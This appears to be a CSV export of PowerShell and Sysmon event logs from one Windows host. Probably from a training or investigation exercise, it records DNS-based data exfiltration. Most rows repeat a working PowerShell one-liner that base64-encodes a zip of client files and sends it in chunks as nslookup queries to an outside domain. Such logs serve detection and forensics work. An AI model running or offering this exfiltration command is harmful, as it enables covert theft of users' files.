IAAgCUAAAAtQAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup IAAgCUAAAAtQAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"QXV6ypsB8mE-0EyZzn-5","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=467	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Where-Object): ""Where-Object""ParameterBinding(Where-Object): name=""FilterScript""; value="" $_ -ne '' ""CommandInvocation(ForEach-Object): ""ForEach-Object""ParameterBinding(ForEach-Object): name=""Process""; value=""Invoke-Expression ""nslookup $_.haz4rdw4re.io""""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""UEsDBBQAAAAIANigLlfVU3cDIgAAAI""ParameterBinding(ForEach-Object): name=""InputObject""; value=""UEsDBBQAAAAIANigLlfVU3cDIgAAAI""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv""ParameterBinding(ForEach-Object): name=""InputObject""; value=""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""U3VtbWFyeS54bHN4c87JTM0rCcgvKk""ParameterBinding(ForEach-Object): name=""InputObject""; value=""U3VtbWFyeS54bHN4c87JTM0rCcgvKk""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""nLz8nMDy7NzU0sqtSryCmu4OVyprsk""ParameterBinding(ForEach-Object): name=""InputObject""; value=""nLz8nMDy7NzU0sqtSryCmu4OVyprsk""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""dGF0aW9uMjAyMy5wcHR488wrSy0uyS""ParameterBinding(ForEach-Object): name=""InputObject""; value=""dGF0aW9uMjAyMy5wcHR488wrSy0uyS""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""8KKEotTs0rSSzJzM8zMjAy1isoKKkA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""8KKEotTs0rSSzJzM8zMjAy1isoKKkA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AFBLAQIUABQAAAAIANigLlfVU3cDIg""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AFBLAQIUABQAAAAIANigLlfVU3cDIg""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AABDbGllbnRQb3J0Zm9saW9TdW1tYX""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AABDbGllbnRQb3J0Zm9saW9TdW1tYX""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X""ParameterBinding(ForEach-Object): name=""InputObject""; value=""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""AAAABbAAAASW52ZXN0b3JQcmVzZW50""ParameterBinding(ForEach-Object): name=""InputObject""; value=""AAAABbAAAASW52ZXN0b3JQcmVzZW50""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""IAAgCUAAAAtQAAAAAA""ParameterBinding(ForEach-Object): name=""InputObject""; value=""IAAgCUAAAAtQAAAAAA""ParameterBinding(Where-Object): name=""InputObject""; value=""""","-","""Where-Object"", "" $_ -ne '' "", ""ForEach-Object"", ""Invoke-Expression ""nslookup $_.haz4rdw4re.io"""", """", ""UEsDBBQAAAAIANigLlfVU3cDIgAAAI"", ""UEsDBBQAAAAIANigLlfVU3cDIgAAAI"", """", ""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv"", ""8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv"", """", ""U3VtbWFyeS54bHN4c87JTM0rCcgvKk"", ""U3VtbWFyeS54bHN4c87JTM0rCcgvKk"", """", ""nLz8nMDy7NzU0sqtSryCmu4OVyprsk"", ""nLz8nMDy7NzU0sqtSryCmu4OVyprsk"", """", ""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA"", ""AFBLAwQUAAAACAC9oC5XHhlO5R8AAA"", """", ""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu"", ""AdAAAAHQAAAEludmVzdG9yUHJlc2Vu"", """", ""dGF0aW9uMjAyMy5wcHR488wrSy0uyS"", ""dGF0aW9uMjAyMy5wcHR488wrSy0uyS"", """", ""8KKEotTs0rSSzJzM8zMjAy1isoKKkA"", ""8KKEotTs0rSSzJzM8zMjAy1isoKKkA"", """", ""AFBLAQIUABQAAAAIANigLlfVU3cDIg"", ""AFBLAQIUABQAAAAIANigLlfVU3cDIg"", """", ""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA"", ""AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA"", """", ""AABDbGllbnRQb3J0Zm9saW9TdW1tYX"", ""AABDbGllbnRQb3J0Zm9saW9TdW1tYX"", """", ""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X"", ""J5Lnhsc3hQSwECFAAUAAAACAC9oC5X"", """", ""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA"", ""HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA"", """", ""AAAABbAAAASW52ZXN0b3JQcmVzZW50"", ""AAAABbAAAASW52ZXN0b3JQcmVzZW50"", """", ""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA"", ""YXRpb24yMDIzLnBwdHhQSwUGAAAAAA"", """", ""IAAgCUAAAAtQAAAAAA"", ""IAAgCUAAAAtQAAAAAA"", """"","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"PnV6ypsB8mE-0EyZw38C","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=455	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AABDbGllbnRQb3J0Zm9saW9TdW1tYX.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AABDbGllbnRQb3J0Zm9saW9TdW1tYX.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"RXV6ypsB8mE-0EyZ8n8U","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=453	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AAAI8AAAAbAAAAAAAAAAAAAAAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"Q3V6ypsB8mE-0EyZ2n-a","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=457	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup J5Lnhsc3hQSwECFAAUAAAACAC9oC5X.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup J5Lnhsc3hQSwECFAAUAAAACAC9oC5X.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"LHV6ypsB8mE-0EyZXX9s","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5432,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"KXV6ypsB8mE-0EyZTX_b","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3952,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"K3V6ypsB8mE-0EyZWX-Q","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=443	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"MHV6ypsB8mE-0EyZhH-d","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=445	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AdAAAAHQAAAEludmVzdG9yUHJlc2Vu.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AdAAAAHQAAAEludmVzdG9yUHJlc2Vu.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"L3V6ypsB8mE-0EyZfH_T","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" AFBLAwQUAAAACAC9oC5XHhlO5R8AAA.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,6604,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"MXV6ypsB8mE-0EyZjH9U","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" dGF0aW9uMjAyMy5wcHR488wrSy0uyS.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5696,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"OXV6ypsB8mE-0EyZs39q","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3454","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3677,3861,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"O3V6ypsB8mE-0EyZu39M","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=435	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"PHV6ypsB8mE-0EyZv38a","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=447	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup dGF0aW9uMjAyMy5wcHR488wrSy0uyS.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup dGF0aW9uMjAyMy5wcHR488wrSy0uyS.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"MnV6ypsB8mE-0EyZkH82","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5520,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"SHV6ypsB8mE-0EyZ-n8t","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=437	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup 8AAAAbAAAAQ2xpZW50UG9ydGZvbGlv.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"PXV6ypsB8mE-0EyZwn_8","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" nLz8nMDy7NzU0sqtSryCmu4OVyprsk.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3800,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"RHV6ypsB8mE-0EyZ8n8R","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,4752,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"QHV6ypsB8mE-0EyZyn_G","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=439	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup U3VtbWFyeS54bHN4c87JTM0rCcgvKk.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"SXV6ypsB8mE-0EyZ_X-U","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=441	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup nLz8nMDy7NzU0sqtSryCmu4OVyprsk.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup nLz8nMDy7NzU0sqtSryCmu4OVyprsk.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
"S3V7ypsB8mE-0EyZBX9k","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" AdAAAAHQAAAEludmVzdG9yUHJlc2Vu.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,5704,"C:\Users\michael.ascot\downloads\exfiltration\","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:51.304","-"
